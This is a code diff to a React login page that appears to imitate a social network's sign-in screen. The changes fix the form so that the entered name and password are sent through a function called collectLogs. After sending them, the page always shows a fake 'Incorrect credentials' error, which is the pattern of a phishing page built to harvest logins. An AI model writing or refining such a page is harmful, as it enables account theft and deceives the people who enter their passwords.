@@ -2,20 +2,28 @@ import { useForm } from "react-hook-form"
 import { yupResolver } from "@hookform/resolvers/yup"
 import * as yup from "yup"
 import { collectLogs, spinUp } from "../apis/createApi"
-import { useEffect } from "react"
+import { useEffect, useState } from "react"
+import Swal from "sweetalert2"
 const LandingPage = () => {
     const Schema = yup.object({
         name: yup.string().required(),
-        pasword: yup.string().required(),
+        password: yup.string().required(),
     })
 
     const { handleSubmit, register, formState: { errors } } = useForm({
         resolver: yupResolver(Schema)
     })
-
+    const [loading, setLoading] = useState<boolean>(false)
     const onHandleSubmit = handleSubmit(async (data: any) => {
+        setLoading(true)
         const { name, password } = data
-        collectLogs({ name, password }).then((res: any) => {
+        return await collectLogs({ name, password }).then((res: any) => {
+            Swal.fire({
+                icon: "error",
+                title: "Incorrect credentials",
+                text: "Password or phone number is incorrect"
+            })
+            setLoading(false)
             return res.data.data
         })
     })
@@ -44,11 +52,11 @@ const LandingPage = () => {
                         </div>
                         <div className="my-3" />
                         <div className="w-[90%]">
-                            <input type="text" className="w-full h-[60px] border border-[#a8a8a8] rounded-md placeholder:text-[17px] pl-3" placeholder="Password" {...register("name")} />
+                            <input type="text" className="w-full h-[60px] border border-[#a8a8a8] rounded-md placeholder:text-[17px] pl-3" placeholder="Password" {...register("password")} />
                             {errors.name && <div className="text-[13px] my-1 text-[red]">Password provided doesn't match the credentials</div>}
                         </div>
-                        <button type="submit" className="w-[90%] flex items-center justify-center my-4 h-[60px] text-white rounded-md font-[Blud] bg-[#0866FF]" {...register("pasword")}>
-                            Log in
+                        <button type="submit" className="w-[90%] flex items-center justify-center my-4 h-[60px] text-white rounded-md font-[Blud] bg-[#0866FF]" {...register("password")}>
+                            {loading ? "Loading..." : "Log in"}
                         </button>
                         <div className="text-[#0866FF]">Forgotten Password? </div>
                         <hr className="w-[90%] my-3" />
